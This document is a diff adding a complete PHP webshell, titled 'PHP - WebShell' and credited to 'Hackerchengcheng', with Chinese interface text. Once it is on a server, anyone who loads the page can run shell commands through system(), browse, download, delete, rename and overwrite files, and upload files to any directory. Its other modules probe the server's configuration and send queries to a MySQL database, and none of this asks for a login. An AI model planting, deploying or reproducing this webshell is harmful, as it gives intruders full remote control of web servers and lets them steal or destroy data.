@@ -1,0 +1,525 @@
+
+<div id="fiexMenu">
+    <ul>
+        <li><a href="?">Home</a></li>
+        <li><a href="#top">Top</a></li>
+    </ul>
+</div>
+<?php
+header("Content-type: text/html; charset=utf-8"); 
+function get_basename($filename){    
+ return preg_replace('/^.+[\\\\\\/]/', '', $filename);    
+}  
+$downfile=iconv('utf-8', 'gb2312', @$_GET["downfile"]);
+$delfile = iconv('utf-8', 'gb2312', @$_GET["delfile"]);
+$refilename = iconv('utf-8', 'gb2312', @$_GET["refilename"]);
+$editfile = iconv('utf-8', 'gb2312', @$_GET["editfile"]);
+if ($downfile) 
+{
+  $name = get_basename(iconv('gb2312', 'utf-8', $downfile));
+  ob_end_clean();
+  $hfile = fopen($downfile, "rb") or die("Can not find file: $path_name\n");
+  Header("Content-type: application/octet-stream");
+  Header("Content-Transfer-Encoding: binary");
+  Header("Accept-Ranges: bytes");
+  Header("Content-Length: ".filesize($downfile));
+  Header("Content-Disposition: attachment; filename=\"$name\"");
+  while (!feof($hfile)) {
+    echo fread($hfile, 32768);
+  }
+  fclose($hfile);
+}
+
+if($delfile!=""){
+  if(is_file($delfile)){
+   $dfilename = iconv('gb2312', 'utf-8', $delfile);
+   $message = (@unlink($delfile))
+   ? "<font color=blue>文件删除成功! `$dfilename` 已经被删除!</font>"
+   : "<font color=blue>文件删除失败! `$dfilename` 存在</font>" ;
+ }else{
+   $message = "<font color=blue>文件 `$dfilename` 不存在!</font>";
+ }
+ echo $message;
+}
+
+
+if ($refilename){
+ echo '<table>';
+ echo '<form action="" method="post">';
+ echo '<br>';
+ echo '<tr>';
+ echo '<td align="left">';
+ echo '<font size="2">';
+ echo '请输入新名称：';
+ echo '<input type="text" name="newname"/>';
+ echo '<input type="submit" value="Rename"/>';
+ echo '</tr>';echo '</td>';echo '</table>';
+ $reRelName = iconv('utf-8', 'gb2312', @$_POST['newname']);
+ $rePath = dirname($refilename).'/'.$reRelName;
+ if (!empty($reRelName) && file_exists($rePath)) {
+  echo '<script>alert(\'文件已存在!\')</script>';
+} else {
+  if (@rename($refilename,$rePath)){
+    echo '<script>alert(\'文件改名成功!\')</script>';}
+    else { 
+      if (!empty($reRelName))
+        echo '<script>alert(\'文件改名失败!\')</script>';
+    }
+  }
+}
+//编辑文件
+if ($editfile) {
+  $content=$editfile;
+  if(empty($_POST['newcontent'])){
+   echo '<table><tr>';
+   echo '<form action="" method="post">';
+   echo '<input type="submit" value="编辑文件"/>';
+   echo '</tr>';    
+   $fp=@fopen($content,"r");
+   $data=@fread($fp,filesize($content));
+   echo '<tr>';
+   echo '<textarea name="newcontent" cols="80" rows="20" >';
+   echo htmlspecialchars($data);
+   @fclose($fp);
+   echo '</textarea></tr></form></table>';
+ }
+ if (!empty($_POST['newcontent']))
+ {
+   $fp=@fopen("$content","w+");
+   echo ($result=@fwrite($fp,$_POST['newcontent']))?"<font color=red>文件注入成功!</font>":"<font color=blue>注入失败！</font>"; 
+   @fclose($fp);
+ }
+}
+
+?>
+<html>
+<title>phpShell</title>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312";>
+<STYLE type="text/css">
+  * {padding: 0; margin: 0;}
+  body {font-family: "微软雅黑"; font-size: 12px;}
+  BODY { width: 80%; margin: 0 auto; background-color:#FDFDFD; box-sizing: border-box; padding: 24px;}
+  a{color: red; text-decoration: none}
+  ul { list-style: none; }
+  a:hover {text-decoration: underline}
+  input {font-family: "微软雅黑";font-size: 12px;}
+  input[type="submit"] { padding: 2px; border: none; outline: none; cursor: pointer; margin-left: 4px; background: #A2B5CD;}
+  td {font-family: "微软雅黑"; font-size: 12px;}
+  tr {padding: 2px 0;}
+  .title {font-family: "微软雅黑";font-size: 20px;font-weight: bold; color=black}
+  .title_name {font-weight: bold; color=black}
+  hr {height: 1px; background: #FFF; border-style: solid; border: none; margin: 16px auto; box-sizing: border-box;}
+  .back {color: #697577;}
+  table b { margin: 8px 0 4px; display: block; }
+  #fiexMenu { position: fixed; right: 16px; bottom: 16px; font-size: 24px; text-align: center;}
+  #fiexMenu a { color: #ddd; }
+  #fiexMenu li { margin: 4px 0; }
+  .child { font-weight: normal; padding-left: 4px; border-left: 2px solid #ddd; }
+</STYLE>
+</head>
+<body>
+ <table id="top" width="100%"  cellspacing="1" cellpadding="3">
+  <tr>
+   <td class="title" align="center">PHP - WebShell</td>
+ </tr>
+</table>
+<hr>
+<table width="100%"  cellspacing="1" cellpadding="3">
+  <tr>
+   <td>
+    <span class="title_name">操作系统 : </span>
+    <?php
+    echo PHP_OS;?></td><td><span class="title_name">服务器名称 : </span><?echo $_SERVER['SERVER_NAME'];?><td><span class="title_name">服务器IP : </span><?echo gethostbyname($_SERVER['SERVER_NAME']);?></tr><tr></td><td><span class="title_name">服务器时间 : </span><?echo date("Y年m月d日 h:i:s",time());?></td><td><span class="title_name">端口 : </span><?echo $_SERVER['SERVER_PORT'];
+    ?>
+  </td></tr>
+</table>
+<hr>
+<table><tr><td><a href="?shell=env">『PHP探针模块』</a></td><td><a href="?shell=checkdir">『目录浏览模块[快速]』</a></td><td> <a href="?shell=command">『命令执行模块』</a></td><td><a href="?shell=sql">『数据库操作模块』</a></td><td><a href="?shell=change">『字符转换模块』</a></td></tr></table>
+<hr>
+<table>
+ <tr>
+  <td>
+   <span class="title_name">根目录 : </span>
+   <a href="?dir=<?php echo $_SERVER['DOCUMENT_ROOT'];?>"><?php echo $_SERVER['DOCUMENT_ROOT'];?></a>
+ </td>
+</tr>
+<tr>
+  <td>
+   <span class="title_name">当前目录 : </span>
+   <?php
+                        //打印目录文件
+   $dir=@$_GET['dir'];
+   if (!isset($dir) or empty($dir)) {
+    $dir=str_replace('\\','/',dirname(__FILE__));
+    echo "<font color=\"#00688B\">".$dir."</font>";
+  } else {
+
+    echo "<font color=\"#00688B\">".$dir."</font>";
+  }
+
+  $upFolder = $dir;
+  ?>
+</td>
+</tr>
+<tr>
+  <td>
+   <form enctype="multipart/form-data" action="" method="post">
+    <span class="title_name">上传文件到该目录 : </span>
+    <input name="upload_file" type="file">
+    <input type="submit" value="上传">
+  </form>
+  <?php
+                        //文件上传
+  $upload_file=@$_FILES['upload_file']['tmp_name'];
+  $upload_file_name=@$_FILES['upload_file']['name'];
+  $upload_file_name = iconv('utf-8', 'gb2312', $upload_file_name);
+  $upload_file_size=@$_FILES['upload_file']['size'];
+  if($upload_file){
+    $file_size_max = 1000*1000;
+    $store_dir = dirname(__FILE__);
+
+                            #决定是否覆盖的开关
+
+    $accept_overwrite = 0;
+
+    if ($upload_file_size > $file_size_max) {
+     echo "文件过大";
+     exit;
+   }
+
+   if (file_exists($upFolder ."\\". $upload_file_name) && !$accept_overwrite) {
+     Echo "文件已存在！";
+     exit;
+   }
+
+   if (!move_uploaded_file($upload_file,$upFolder."\\".$upload_file_name)) {
+     echo "上传文件失败！";
+     exit;
+   }
+
+   Echo "<p style=\"margin-left: 16px; display: inline-block;\">上传的文件:";
+   echo "<font color=blue>".$_FILES['upload_file']['name']."</font>";
+   echo "\t";
+
+   Echo "文件大小:";
+   echo "<font color=blue>".$_FILES['upload_file']['size']." Bytes</font>";
+   echo "\t";
+
+   Echo "成功...</p>"; 
+ }
+ ?>
+</td>
+</tr>
+</table>
+<?php
+echo '<table width="100%" border="0" cellspacing="1" cellpadding="3">';
+echo '<form action="" method="get">';
+echo '<tr>';
+echo '<td>';
+echo "<span class=\"title_name\">浏览目录 : </span>";
+echo '<input type="text" name="dir" style="font-family:Verdana,Arial; font-size: 9pt;">';
+echo '<input type="submit" value="GoTo">';
+echo '</td>';
+echo '</tr>';
+echo '</form>';
+echo '<br />';
+echo '<table width="100%" border="0" cellpadding="3" cellspacing="1">';
+echo '<tr>';
+echo '<td><b class="child">';echo "子文件夹";echo '</b></td>';
+echo '</tr>';
+
+            #打印上层目录
+$dirs=@opendir($dir);
+while ($file=@readdir($dirs)) {
+ $b="$dir/$file";
+                // $file=iconv("utf-8","gbk",$file);
+ $file = mb_convert_encoding($file,'UTF-8','GBK');
+ $a=@is_dir($b);
+ if($a=="1"){
+  if($file!=".."&&$file!=".")  {
+   echo "<tr>\n";
+   echo "  <td><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">$file</a></td>\n";
+   echo "</tr>\n";
+ } else {
+   if($file=="..") {
+    echo "<tr>\n";
+    echo "<td><a class=\"back\" href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">返回上级目录</a></td>";
+    echo "</tr>\n";
+  }
+}
+}
+}
+@closedir($dirs);
+?>
+</table>
+<br>
+<b class="child">子文件</b>
+<table width="100%" border="0" cellpadding="3" cellspacing="1">
+  <tr>
+   <td><b>文件名</b></td>
+   <td><b>创建时间</b></td>
+   <td><b>大小</b></td>
+   <td><b>操作</b></td>
+ </tr>
+
+ <?php
+
+    //打印文件
+
+ $dirs=@opendir($dir);
+ while ($file=@readdir($dirs)) {
+   $rFile = $file;
+   $file = iconv('gb2312','utf-8',$file);
+   $b="$dir/$rFile";
+   $a=@is_dir($b);
+   if($a=="0"){
+    $size=@filesize($b)/1024; 
+    $lastsave=@date("Y-n-d H:i:s",filectime($b));
+    echo "<tr>\n";
+    echo "<td>$file</td>\n";
+    echo "  <td>$lastsave</td>\n";
+    echo "  <td>$size KB</td>\n";
+    echo "  <td><a href=\"?downfile=".urlencode($dir)."/".urlencode($file)."\">［下载］ </a><a href=\"?delfile=".urlencode($dir)."/".urlencode($file)."\">［删除］</a></a><a href=\"?refilename=".urlencode($dir)."/".urlencode($file)."\"> ［重命名］</a><a href=\"?editfile=".urlencode($dir)."/".urlencode($file)."\">［注入］ </a></td>\n";
+    echo "</tr>\n";
+  }
+}
+@closedir($dirs);
+?></table>
+<hr>
+<?php
+    #打印环境
+if (isset($_GET['shell'])) {
+
+ if ($_GET['shell']=="env"){
+  function dir_wriable($dir){
+          $xY7_test=tempnam("$dir","test_file"); #测试写
+          if ($fp=@fopen($xY7_test,"w")){
+              @fclose($fp);
+              @unlink($xY7_test);
+              $wriable="ture";
+          }
+          else {
+              $wriable=false or die ("Cannot open $xY7_test!");
+          }
+          return $wriable;
+        }
+        if (dir_wriable(str_replace('//','/',dirname(__FILE__)))){
+         $dir_wriable='目录可写';
+         echo "<b>当前目录可写!^ _ ^</b>";
+       }
+       else{
+         $dir_wriable='目录不可写';
+         echo "<b>当前目录不可写！</b>";
+       }
+
+       function getinfo($xy7)
+{
+         if($xy7==1)
+         {
+          $s='<font color=blue>YES<b>√</b></font>';
+        }
+        else
+        {
+          $s='<font color=red>NO<b>×</b></font>';
+        }
+        return $s;
+      } 
+      echo '<br><br>';
+      echo "服务器系统：" ;
+      echo PHP_OS;
+      echo '<br>'   ;
+      echo "服务器域名:";
+      echo $_SERVER['SERVER_NAME'];
+      echo '<br>';
+      echo "WEB服务器端口：";
+      echo $_SERVER['SERVER_PORT'];
+      echo '<br>';
+      echo "服务器时间:";
+      echo date("Y年m月d日 h:i:s",time());
+      echo '<br>';
+      echo "服务器IP地址:";
+      echo gethostbyname($_SERVER['SERVER_NAME']);
+      echo '<br>';
+      echo "服务器操作系统文字编码:";
+      echo $_SERVER['HTTP_ACCEPT_LANGUAGE'];
+      echo '<br>';
+      echo "服务器解释引擎:";
+      echo $_SERVER['SERVER_SOFTWARE'];
+      echo '<br>';
+      echo "PHP运行方式:";
+      echo strtoupper(php_sapi_name());
+      echo '<br>';
+      echo "PHP版本:";
+      echo PHP_VERSION;
+      echo '<br>';
+      echo "ZEND版本:";
+      echo zend_version();
+      echo '<br>';
+      echo "本文件绝对路径:";
+      echo __FILE__;
+      echo '<br>';
+      echo "服务器剩余空间:";
+      echo intval(diskfreespace(".") / (1024 * 1024)).'MB';
+      echo '<br>';
+      echo "脚本运行可占最大内存:";
+      echo get_cfg_var("memory_limit");
+      echo '<br>';
+      echo "脚本上传文件大小限制:";
+      echo get_cfg_var("upload_max_filesize");
+      echo '<br>';
+      echo "被屏蔽函数:";
+      echo get_cfg_var("disable_functions");
+      echo '<br>';
+      echo "POST方法提交限制:";
+      echo get_cfg_var("post_max_size");
+      echo '<br>';
+      echo "脚本超时时间:";
+      echo get_cfg_var("max_execution_time")."秒";
+      echo '<br>';
+      echo "动态链接库:";
+      echo getinfo(get_cfg_var("enable_dl"));
+      echo '<br>';
+      echo "自定义全局变量:";
+      echo getinfo(get_cfg_var("register_globals"));
+      echo '<br>';
+      echo "显示错误信息:";
+      echo getinfo(get_cfg_var("display_errors"));
+      echo '<br>';
+      echo "PHP安全模式:";
+      echo getinfo(get_cfg_var("safe_mode"));
+      echo '<br>';
+      echo "FTP文件传输:";
+      echo getinfo(get_magic_quotes_gpc("FTP support"));
+      echo '<br>';
+      echo"允许使用URL打开文件:";
+      echo getinfo(get_cfg_var("allow_url_fopen"));
+      echo '<br>';
+      echo "SESSION支持:";
+      echo getinfo(function_exists("session_start"));
+      echo '<br>';
+      echo "Socket支持:";
+      echo getinfo(function_exists("fsockopen"));
+      echo '<br>';
+      echo "MYSQL数据库:";
+      echo getinfo(function_exists("mysql_close"));
+      echo '<br>';
+      echo "SQL SERVER数据库:";
+      echo getinfo(function_exists("mssql_close"));
+      echo '<br>';
+      echo "ODBC数据库:";
+      echo getinfo(function_exists("odbc_close"));
+      echo '<br>';
+      echo "Oracle数据库:";
+      echo getinfo(function_exists("ora_close"));
+      echo '<br>';
+      echo "SNMP协议:";
+      echo getinfo(function_exists("snmpget"));
+      echo '<br>';
+      echo '<br>';
+    }
+    elseif ($_GET['shell']=="checkdir"){
+     global $PHP_SELF;
+     echo '<form action="" method="post">';
+     echo "快速目录浏览:";
+     echo '<input type="text" name="dir" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
+     echo '<input type="submit" value="GoTo" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
+     echo '<br>';
+     echo '<textarea name="textarea" cols="70" rows="15">';
+     if (empty($_POST['dir']))
+      $newdir="./";
+    else
+      $newdir=$_POST['dir'];
+    $handle=@opendir($newdir);
+    while ($file=@readdir($handle))
+    {
+      echo ("$file \n");}
+      echo '</textarea></form>';
+    }
+    elseif ($_GET['shell']=="command"){
+      echo '<table>';
+      echo '<form action="" method="post">';
+      echo '<br>';
+      echo '<tr>';
+      echo '<td align="left">';
+      echo '输入命令 : ';
+      echo '<input type="text" name="cmd" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
+      echo '<input type="submit" value="运行" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD"/>';
+      echo '</tr>';echo '</td>';
+      echo '<tr>';
+      echo '<td>';
+      echo '<textarea name="textarea" cols="70" rows="15" readonly>';
+      @system($_POST['cmd']);
+      echo '</textarea></form>';
+    }
+
+    elseif ($_GET['shell']=="change"){
+      echo '<form action="" method="post">';
+      echo '<br>';
+      echo "Enter binary character:";
+      echo '<input type="text" name="char" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
+      echo '<input type="submit" value="Transforms to Hexadecimal" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
+      echo '</form>';
+      echo '<textarea name="textarea" cols="40" rows="1" readonly>';
+      $result=bin2hex($_POST['char']);
+      echo "0x".$result;
+      echo '</textarea>';
+    }
+
+//mysql操作
+
+    elseif ($_GET['shell']=="sql"){
+      echo '<table align="center" cellSpacing=8 cellPadding=4>';
+      echo '<tr><td>';
+      echo '<form action="" method="post">';
+      echo "Host:";
+      echo '<input name="servername" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
+      echo '</td><td>';
+      echo "Username:";
+      echo '<input name="username" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
+      echo '</td></tr>';
+      echo '<tr><td>';
+      echo "Password:";
+      echo '<input name="password" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
+      echo '</td><td>';
+      echo "DBname:";
+      echo '<input name="dbname" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
+      echo '</td></tr>';
+      $servername = $_POST['servername'];
+      $username = $_POST['username'];
+      $password = $_POST['password'];
+      $dbname = $_POST['dbname'];
+
+      if ($link=@mysql_connect($servername,$username,$password) and @mysql_select_db($dbname)) {
+       echo "<font color=blue>The database connects successfully!</font>";
+       echo "<br>";
+
+     } else {
+       echo "<font color=red>".mysql_error()."</font>";
+       echo "<br>";
+     }
+     $dbresult = $_POST['query'];
+
+     if (!empty($dbresult)){
+       $dbresult = @mysql_query($dbresult);
+       echo ($dbresult) ? "<font color=blue>Execution successfully!</font>" : "<font color=blue>The request makes a mistake:</font> "."<font color=red>".mysql_error()."</font>";
+       mysql_close();}
+       echo '<tr><td>';
+       echo '<textarea name="query" cols="60" rows="10">';
+       echo '</textarea>';
+       echo '</td></tr>';
+       echo '<tr><td align="center">';
+       echo '<input type="submit" value="Execution SQL_query" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
+       echo '</td></tr>';
+       echo '</table>';
+     }
+
+   }
+   ?>
+
+   <table style="width: 100%; text-align: center; color: #ddd;">
+    <tr>
+     <td>
+      <h6>Copyright (C) 2023 by:Hackerchengcheng
+      </td>
+    </tr>
+  </table>
